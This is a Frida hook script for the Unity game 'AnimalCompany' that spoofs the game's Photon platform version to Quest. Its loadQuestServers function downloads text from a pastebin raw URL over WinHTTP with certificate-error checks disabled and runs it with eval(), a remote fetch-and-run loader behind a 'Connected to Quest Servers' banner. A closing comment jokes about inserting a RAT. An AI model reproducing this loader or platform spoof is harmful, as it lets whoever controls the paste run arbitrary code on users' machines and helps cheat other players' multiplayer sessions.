// @ts-nocheck
declare const ptr: any;
declare const Interceptor: any;
declare const Module: any;
declare const Memory: any;
declare const NativeFunction: any;
declare const Script: any;

const QUEST_PLATFORM = 1;
const SYMBOLS_URL = "https://pastebin.com/raw/wHwgU709";

function parseUrl(url: string): {
  hostname: string;
  path: string;
  port: number;
} {
  const match = url.match(/^https?:\/\/([^/:]+)(?::(\d+))?(.*)$/);
  if (!match) {
    return { hostname: "", path: "/", port: 443 };
  }
  const hostname = match[1];
  const port = match[2]
    ? parseInt(match[2])
    : url.startsWith("https")
      ? 443  
      : 80;
  const path = match[3] || "/";
  return { hostname, path, port };
}

function httpRequest(
  url: string,
  method: string,
  headers: any,
  body?: string,  
): Promise<{ status: number; data: string }> {
  return new Promise((resolve) => {
    try {
      const winhttp = Module.load("winhttp.dll");

      const WinHttpOpen = new NativeFunction(
        winhttp.getExportByName("WinHttpOpen"),
        "pointer",
        ["pointer", "uint32", "pointer", "pointer", "uint32"],
      );

      const WinHttpConnect = new NativeFunction(
        winhttp.getExportByName("WinHttpConnect"),
        "pointer",
        ["pointer", "pointer", "uint32", "uint32"],
      );  

      const WinHttpOpenRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpOpenRequest"),
        "pointer",
        [
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "uint32",
        ],
      );

      const WinHttpSendRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpSendRequest"),
        "bool",
        [
          "pointer",
          "pointer",  
          "uint32",
          "pointer",
          "uint32",
          "uint32",
          "pointer",
        ],
      );

      const WinHttpReceiveResponse = new NativeFunction(
        winhttp.getExportByName("WinHttpReceiveResponse"),
        "bool",
        ["pointer", "pointer"],
      );

      const WinHttpQueryHeaders = new NativeFunction(
        winhttp.getExportByName("WinHttpQueryHeaders"),  
        "bool",
        ["pointer", "uint32", "pointer", "pointer", "pointer", "pointer"],
      );

      const WinHttpReadData = new NativeFunction(  
        winhttp.getExportByName("WinHttpReadData"),
        "bool",
        ["pointer", "pointer", "uint32", "pointer"],
      );

      const WinHttpCloseHandle = new NativeFunction(
        winhttp.getExportByName("WinHttpCloseHandle"),  
        "bool",
        ["pointer"],
      );

      const WinHttpSetOption = new NativeFunction(
        winhttp.getExportByName("WinHttpSetOption"),
        "bool",
        ["pointer", "uint32", "pointer", "uint32"],
      );

      const WinHttpSetTimeouts = new NativeFunction(
        winhttp.getExportByName("WinHttpSetTimeouts"),
        "bool",
        ["pointer", "int32", "int32", "int32", "int32"],
      );

      const GetLastError = new NativeFunction(
        Module.load("kernel32.dll").getExportByName("GetLastError"),
        "uint32",
        [],
      );

      const urlParts = parseUrl(url);
      const hostname = urlParts.hostname;
      const path = urlParts.path;
      const port = urlParts.port;

      const userAgent = Memory.allocUtf16String(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      );
      const hSession = WinHttpOpen(userAgent, 0, ptr(0), ptr(0), 0);

      if (hSession.isNull()) {
        resolve({
          status: 0,
          data: "WinHttpOpen failed (" + GetLastError() + ")",
        });
        return;
      }

      WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

      const hostnameW = Memory.allocUtf16String(hostname);
      const hConnect = WinHttpConnect(hSession, hostnameW, port, 0);

      if (hConnect.isNull()) {
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpConnect failed" });
        return;
      }

      const pathW = Memory.allocUtf16String(path);
      const methodW = Memory.allocUtf16String(method);
      const hRequest = WinHttpOpenRequest(
        hConnect,
        methodW,
        pathW,
        ptr(0),
        ptr(0),
        ptr(0),
        url.startsWith("https") ? 0x00800000 : 0,
      );

      if (hRequest.isNull()) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpOpenRequest failed" });
        return;
      }

      const flagsBuf = Memory.alloc(4);
      flagsBuf.writeU32(0x00000100 | 0x00000200 | 0x00001000 | 0x00002000);
      WinHttpSetOption(hRequest, 31, flagsBuf, 4);

      let headersStr = "";
      for (const key in headers) {
        headersStr += key + ": " + headers[key] + "\r\n";
      }
      const headersW = Memory.allocUtf16String(headersStr);

      const bodyPtr = body ? Memory.allocUtf8String(body) : ptr(0);
      const bodyLen = body ? body.length : 0;

      if (
        !WinHttpSendRequest(
          hRequest,
          headersW,
          -1,
          bodyPtr,
          bodyLen,
          bodyLen,
          ptr(0),
        )
      ) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpSendRequest failed (" + err + ")" });
        return;
      }

      if (!WinHttpReceiveResponse(hRequest, ptr(0))) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({
          status: 0,
          data: "WinHttpReceiveResponse failed (" + err + ")",
        });
        return;
      }

      const statusBuffer = Memory.alloc(4);
      const statusSize = Memory.alloc(4);
      statusSize.writeU32(4);

      WinHttpQueryHeaders(
        hRequest,
        0x20000013,
        ptr(0),
        statusBuffer,
        statusSize,
        ptr(0),
      );
      const statusCode = statusBuffer.readU32();

      const buffer = Memory.alloc(8192);
      const bytesRead = Memory.alloc(4);
      let responseData = "";

      while (WinHttpReadData(hRequest, buffer, 8192, bytesRead)) {
        const size = bytesRead.readU32();
        if (size === 0) break;
        responseData += buffer.readUtf8String(size);
      }

      WinHttpCloseHandle(hRequest);
      WinHttpCloseHandle(hConnect);
      WinHttpCloseHandle(hSession);

      resolve({ status: statusCode, data: responseData });
    } catch (e) {
      console.log("[-] HTTP request error: " + e);
      resolve({ status: 0, data: "Error: " + e });
    }
  });
}

async function loadQuestServers() {
  console.log("\n");
  console.log("------------------------------");
  console.log("[+] Connected to Quest Servers");
  console.log("[+] Made ItzDaTree");
  console.log("------------------------------");

  const symResponse = await httpRequest(SYMBOLS_URL, "GET", {});
  if (symResponse.status === 200) {
    try {
      eval(symResponse.data);

      const mapping: any = {
        il2cpp_init: "xLUAhdodn_t",
        il2cpp_init_utf16: "xcvLpPQmvKX",
        il2cpp_shutdown: "EHlxmKwhNRj",
        il2cpp_set_config_dir: "PfxOYtTAxoj",
        il2cpp_set_data_dir: "uWsXSpsMcjV",
        il2cpp_set_temp_dir: "ERcLMeCvReV",
        il2cpp_set_commandline_arguments: "AzoJLlrbdEq",
        il2cpp_set_commandline_arguments_utf16: "UcP_FjTiDfz",
        il2cpp_set_config_utf16: "TTOeDtuVxcn",
        il2cpp_set_config: "FhzOJQLhNmL",
        il2cpp_set_memory_callbacks: "bIuvJYsHeLD",
        il2cpp_memory_pool_set_region_size: "WeoZkBICTlh",
        il2cpp_memory_pool_get_region_size: "b_TLWmgDkDh",
        il2cpp_get_corlib: "rTlNlvaLBMy",
        il2cpp_add_internal_call: "KtWCZyzqTRt",
        il2cpp_resolve_icall: "cR_gpGUnekL",
        il2cpp_alloc: "YoVAqyxVxij",
        il2cpp_free: "YgwLOQaGBsT",
        il2cpp_array_class_get: "RDFjRTKYSMA",
        il2cpp_array_length: "WVcxTOPECvu",
        il2cpp_array_get_byte_length: "GSRxUUUSjDQ",
        il2cpp_array_new: "egrCeiZVYHO",
        il2cpp_array_new_specific: "GVUcSMUcqvh",
        il2cpp_array_new_full: "rkKzWnjCi_L",
        il2cpp_bounded_array_class_get: "IhLlhPD_KZp",
        il2cpp_array_element_size: "FDAdOFlLLab",
        il2cpp_assembly_get_image: "SWFWBYSbRIM",
        il2cpp_class_for_each: "NAAPpXbNTyN",
        il2cpp_class_enum_basetype: "fULDqPBdjCg",
        il2cpp_class_is_inited: "DaNCJAPicAk",
        il2cpp_class_is_generic: "pblWDynaLpa",
        il2cpp_class_is_inflated: "fAUJyQSyMmP",
        il2cpp_class_is_assignable_from: "jHHLOEZDW_M",
        il2cpp_class_is_subclass_of: "LecTr_lGAMt",
        il2cpp_class_has_parent: "GMqbpARKwkZ",
        il2cpp_class_from_il2cpp_type: "gKXgdZYBhDI",
        il2cpp_class_from_name: "LUWrCwFqpwK",
        il2cpp_class_from_system_type: "vHSCPrgyBRN",
        il2cpp_class_get_element_class: "ESJwuVCaMMp",
        il2cpp_class_get_events: "DLzsrHBDBNS",
        il2cpp_class_get_fields: "GHrhFi_RUpB",
        il2cpp_class_get_nested_types: "aiBmBFcEUOQ",
        il2cpp_class_get_interfaces: "GZYCPVnNkUH",
        il2cpp_class_get_properties: "FFSuRYvsnvz",
        il2cpp_class_get_property_from_name: "GHANgfbFQiW",
        il2cpp_class_get_field_from_name: "xaglNxNGyla",
        il2cpp_class_get_methods: "aEoBuoCFMhe",
        il2cpp_class_get_method_from_name: "GkuhQsfoMZx",
        il2cpp_class_get_name: "GlAiIYAwSIy",
        il2cpp_type_get_name_chunked: "hyOCWjIzWiR",
        il2cpp_class_get_namespace: "xDSrdyWjF_f",
        il2cpp_class_get_parent: "oZRJFJhu_Kr",
        il2cpp_class_get_declaring_type: "moXlGUJchaJ",
        il2cpp_class_instance_size: "zqioAqLHPCi",
        il2cpp_class_num_fields: "UZcGGItBkMB",
        il2cpp_class_is_valuetype: "_IWQbyAPViy",
        il2cpp_class_value_size: "LWPcWsWpOjR",
        il2cpp_class_is_blittable: "JKIHWKbcClf",
        il2cpp_class_get_flags: "CIXpLVuWVzA",
        il2cpp_class_is_abstract: "AOLteFYPxdC",
        il2cpp_class_is_interface: "ihSlhbgpQ_T",
        il2cpp_class_array_element_size: "QjUeysboyoU",
        il2cpp_class_from_type: "WtXlMEC_QcH",
        il2cpp_class_get_type: "lwKuygxcSXK",
        il2cpp_class_get_type_token: "bnLOtLuzamO",
        il2cpp_class_has_attribute: "ISaUcjLetvH",
        il2cpp_class_has_references: "hqgpgyvnbXd",
        il2cpp_class_is_enum: "QBcUShmlOdO",
        il2cpp_class_get_image: "VSwnpSUXFpn",
        il2cpp_class_get_assemblyname: "zuoopZsIWZb",
        il2cpp_class_get_rank: "uJdYTJPNCHl",
        il2cpp_class_get_data_size: "UECkFbedydN",
        il2cpp_class_get_static_field_data: "LxiaWtWbfhQ",
        il2cpp_stats_dump_to_file: "xGgySFOmtqa",
        il2cpp_stats_get_value: "XhnlsibakaI",
        il2cpp_domain_get: "edMrlOVuLpk",
        il2cpp_domain_get_assemblies: "ByndQSudYTs",
        il2cpp_raise_exception: "CBCybyyZWxW",
        il2cpp_exception_from_name_msg: "LjtJnryINqn",
        il2cpp_get_exception_argument_null: "DjllfKSfeQI",
        il2cpp_format_exception: "XYJuJafeNin",
        il2cpp_format_stack_trace: "UmlePNXljZC",
        il2cpp_unhandled_exception: "rKVNaJonMtv",
        il2cpp_native_stack_trace: "qWepoRsvakm",
        il2cpp_field_get_flags: "vNmEMAKYlTV",
        il2cpp_field_get_from_reflection: "WpqbobVrQPI",
        il2cpp_field_get_name: "qvoTIK_AUr_",
        il2cpp_field_get_parent: "RwcWExKbkZy",
        il2cpp_field_get_object: "arCLRqizkdO",
        il2cpp_field_get_offset: "SqefGQ_RBXj",
        il2cpp_field_get_type: "AqV_glAOYxP",
        il2cpp_field_get_value: "NDkUFWEOvsh",
        il2cpp_field_get_value_object: "QhxBZWRIaSt",
        il2cpp_field_has_attribute: "ZPdr_fPEBUn",
        il2cpp_field_set_value: "fBcsbxWcpxo",
        il2cpp_field_static_get_value: "viOSToIqomy",
        il2cpp_field_static_set_value: "dISoKZlIfVz",
        il2cpp_field_set_value_object: "qarhOPzvtVR",
        il2cpp_field_is_literal: "bjPLSgdRnEX",
        il2cpp_gc_collect: "myFkumtcvAi",
        il2cpp_gc_collect_a_little: "ZrwZJkizlfw",
        il2cpp_gc_start_incremental_collection: "sIIqDeNqmio",
        il2cpp_gc_disable: "nmZYbrFVkNq",
        il2cpp_gc_enable: "hYMcukDWNct",
        il2cpp_gc_is_disabled: "BbvdMIsPmrN",
        il2cpp_gc_set_mode: "MncDkzxZgmP",
        il2cpp_gc_get_max_time_slice_ns: "jGAzQlgdsLh",
        il2cpp_gc_set_max_time_slice_ns: "JdlbtOkuqVv",
        il2cpp_gc_is_incremental: "_kzXcXgLv_n",
        il2cpp_gc_get_used_size: "TXXqfxdREmR",
        il2cpp_gc_get_heap_size: "tYlVmKYb_SN",
        il2cpp_gc_wbarrier_set_field: "LjybxMQFBcz",
        il2cpp_gc_has_strict_wbarriers: "KicekGJsOoW",
        il2cpp_gc_set_external_allocation_tracker: "XugrPpYgjuL",
        il2cpp_gc_set_external_wbarrier_tracker: "KsDoYdVD_bb",
        il2cpp_gc_foreach_heap: "gT_qQhSTgSV",
        il2cpp_stop_gc_world: "ORyeOfLmMLM",
        il2cpp_start_gc_world: "pdDlKHXmMnp",
        il2cpp_gc_alloc_fixed: "rFEedDW_XwV",
        il2cpp_gc_free_fixed: "sbySKjzSLTq",
        il2cpp_gchandle_new: "RKjeRHRwkJH",
        il2cpp_gchandle_new_weakref: "izRAABURHDq",
        il2cpp_gchandle_get_target: "FWQhiHHcXfH",
        il2cpp_gchandle_free: "nykVKqLMiiI",
        il2cpp_gchandle_foreach_get_target: "MmzonizRTgP",
        il2cpp_object_header_size: "QDGyOdXgdhH",
        il2cpp_array_object_header_size: "raBTaRMiyIH",
        il2cpp_offset_of_array_length_in_array_object_header: "wDhHquwTbrb",
        il2cpp_offset_of_array_bounds_in_array_object_header: "jcVNnqlbtnQ",
        il2cpp_allocation_granularity: "AYmDxSxhjKo",
        il2cpp_unity_liveness_allocate_struct: "ANDzECkREsh",
        il2cpp_unity_liveness_calculation_from_root: "vMkSOdEWwiU",
        il2cpp_unity_liveness_calculation_from_statics: "BtslfdpIJuN",
        il2cpp_unity_liveness_finalize: "aaWzdCYQJYU",
        il2cpp_unity_liveness_free_struct: "ikbdYtvYbsP",
        il2cpp_method_get_return_type: "CBNWBfiGOpG",
        il2cpp_method_get_declaring_type: "oIFoyTaHSBW",
        il2cpp_method_get_name: "nJmmEPULEbk",
        il2cpp_method_get_from_reflection: "tiAtEswulTy",
        il2cpp_method_get_object: "xzLgNEVAJon",
        il2cpp_method_is_generic: "ymoTf_gDdFJ",
        il2cpp_method_is_inflated: "OZKGGtoUqNF",
        il2cpp_method_is_instance: "sAqwyXccrlr",
        il2cpp_method_get_param_count: "eJekTHcQCAF",
        il2cpp_method_get_param: "KGYgfuycUOp",
        il2cpp_method_get_class: "TBNArIQjIMD",
        il2cpp_method_has_attribute: "uiRaBPmREXt",
        il2cpp_method_get_flags: "yJvdpKXFZOb",
        il2cpp_method_get_token: "pkXgVpJosXI",
        il2cpp_method_get_param_name: "CObZBzAkQcd",
        il2cpp_property_get_flags: "_vNwFxZwPRC",
        il2cpp_property_get_get_method: "oplfyZfjjFa",
        il2cpp_property_get_set_method: "RguMtoZFvzu",
        il2cpp_property_get_name: "mOMDwxLbWKq",
        il2cpp_property_get_parent: "gw_GK_hQMPJ",
        il2cpp_object_get_class: "fGVQoTZfWJr",
        il2cpp_object_get_size: "ckbsbzwrK_s",
        il2cpp_object_get_virtual_method: "FjlXQEfuJeM",
        il2cpp_object_new: "DhLRFOdFVKH",
        il2cpp_object_unbox: "KwDbzVshGcP",
        il2cpp_value_box: "JGDKftedFFt",
        il2cpp_monitor_enter: "edgYceagv_G",
        il2cpp_monitor_try_enter: "hxCFXrZkEZf",
        il2cpp_monitor_exit: "MgCcPZQiysU",
        il2cpp_monitor_pulse: "PMHfysrvNak",
        il2cpp_monitor_pulse_all: "lrOdioPXnlA",
        il2cpp_monitor_wait: "Q_qlWaoxdQJ",
        il2cpp_monitor_try_wait: "WCS_gHJUIbc",
        il2cpp_runtime_invoke: "EEcRrxOtUTp",
        il2cpp_runtime_invoke_convert_args: "eNLxofZaoOn",
        il2cpp_runtime_class_init: "liqXlPbvaUL",
        il2cpp_runtime_object_init: "XdIjGOwWfkq",
        il2cpp_runtime_object_init_exception: "AWLFJyrQYgs",
        il2cpp_runtime_unhandled_exception_policy_set: "ulxfoaZLaGY",
        il2cpp_string_length: "kZUaEUpndrE",
        il2cpp_string_chars: "dsMASxnWkP_",
        il2cpp_string_new: "xXlGrpHWguc",
        il2cpp_string_new_len: "cDBrXHJbzHs",
        il2cpp_string_new_utf16: "Z_VLPQgZyrE",
        il2cpp_string_new_wrapper: "tzsKimowBev",
        il2cpp_string_intern: "iVeOHqevzno",
        il2cpp_string_is_interned: "MGVvHssqgCx",
        il2cpp_thread_current: "ukzlisszdWk",
        il2cpp_thread_attach: "kYLuqIYrtrz",
        il2cpp_thread_detach: "yV_CrNt_RTx",
        il2cpp_is_vm_thread: "LrumiQfSwxk",
        il2cpp_current_thread_walk_frame_stack: "TwQXKqpsKrl",
        il2cpp_thread_walk_frame_stack: "bLdXVaW_afB",
        il2cpp_current_thread_get_top_frame: "BFDJCzhIwke",
        il2cpp_thread_get_top_frame: "kCQcJJYdFqe",
        il2cpp_current_thread_get_frame_at: "AhuVSXhvtlc",
        il2cpp_thread_get_frame_at: "GHUVwNiSeIT",
        il2cpp_current_thread_get_stack_depth: "AknExdGanne",
        il2cpp_thread_get_stack_depth: "clMEjtNDFTP",
        il2cpp_override_stack_backtrace: "GBQYUteJkGo",
        il2cpp_type_get_object: "sRrLQNafC_a",
        il2cpp_type_get_type: "ItzdIlBQwzt",
        il2cpp_type_get_class_or_element_class: "HjHtSIucizI",
        il2cpp_type_get_name: "I_ckjXelbkg",
        il2cpp_type_is_byref: "eql_gQbOUDZ",
        il2cpp_type_get_attrs: "sWXABCQNmTX",
        il2cpp_type_equals: "MPDvusdObPc",
        il2cpp_type_get_assembly_qualified_name: "LR_BeHzoHUu",
        il2cpp_type_get_reflection_name: "fYfdDfuTTsb",
        il2cpp_type_is_static: "VgLwZRxHBIR",
        il2cpp_type_is_pointer_type: "wKYcYCXfjTZ",
        il2cpp_image_get_assembly: "KQiBfMEKmzz",
        il2cpp_image_get_name: "lHblwBnlZGc",
        il2cpp_image_get_filename: "CLqRFVcVOgA",
        il2cpp_image_get_entry_point: "LpvqIXjbXUK",
        il2cpp_image_get_class_count: "cSGLoRuQiHO",
        il2cpp_image_get_class: "RhLDAHpEUcw",
        il2cpp_capture_memory_snapshot: "jYrCsYfaRdp",
        il2cpp_free_captured_memory_snapshot: "IoWr_SvdRqc",
        il2cpp_set_find_plugin_callback: "fulKAUGWBIS",
        il2cpp_register_log_callback: "eTIjCrdZBjh",
        il2cpp_debugger_set_agent_options: "nvUhhHOkZST",
        il2cpp_is_debugger_attached: "QHYSNghENUy",
        il2cpp_register_debugger_agent_transport: "ZvSPyAJFUiv",
        il2cpp_debug_foreach_method: "dNxnpjCCfmq",
        il2cpp_debug_get_method_info: "ApCrAroVTWL",
        il2cpp_unity_install_unitytls_interface: "ctGcxEmaCbm",
        il2cpp_custom_attrs_from_class: "FoxALlttGgv",
        il2cpp_custom_attrs_from_method: "AdNr_iEGWoP",
        il2cpp_custom_attrs_from_field: "dMFxeqdeAej",
        il2cpp_custom_attrs_get_attr: "hGntTeeNcwG",
        il2cpp_custom_attrs_has_attr: "XanvRBkTEfD",
        il2cpp_custom_attrs_construct: "XtIcECOA_sE",
        il2cpp_custom_attrs_free: "JEEriqYgGAy",
        il2cpp_class_set_userdata: "CRcfNkRYYnZ",
        il2cpp_class_get_userdata_offset: "EmAFuSUgJZh",
        il2cpp_set_default_thread_affinity: "mYhRJhA__bX",
        il2cpp_unity_set_android_network_up_state_func: "oyGmxOCqOvP",
        il2cpp_domain_assembly_open: "NFRgifTBdwS",
    };

      const symbols = (Il2Cpp as any).$config.exports;
      if (symbols) {
        for (const key in symbols) {
          if (mapping[key]) {
            symbols[mapping[key]] = symbols[key];
          }
        }
      }

  Il2Cpp.perform(() => {
    const findClass = (n: string) => {
      for (const a of Il2Cpp.domain.assemblies) {
        try {
          const k = a.image.tryClass(n);
          if (k) return k;
        } catch (_) {}
      }
      return null;
    };

    const AppUtils = findClass("AnimalCompany.AppUtils");
    if (!AppUtils) {
      console.log("[-] AppUtils not found");
      return;
    }

    let method: any = null;
    for (const m of AppUtils.methods) {
      if (
        /CalculatePhotonAppVersion/i.test(m.name) &&
        (m.returnType?.name || "") === "System.String"
      ) {
        method = m;
        break;
      }
    }

    if (!method) {
      console.log("[-] CalculatePhotonAppVersion not found");
      return;
    }

    Interceptor.attach(method.virtualAddress, {
      onEnter(args: any) {
        try {
          args[2] = ptr(QUEST_PLATFORM);
        } catch (_) {}
      },
    });
  });
    } catch (e) {
      console.log("[-] Error: " + e);
    }
  }
}
// insert rat here because im totally byte 
loadQuestServers();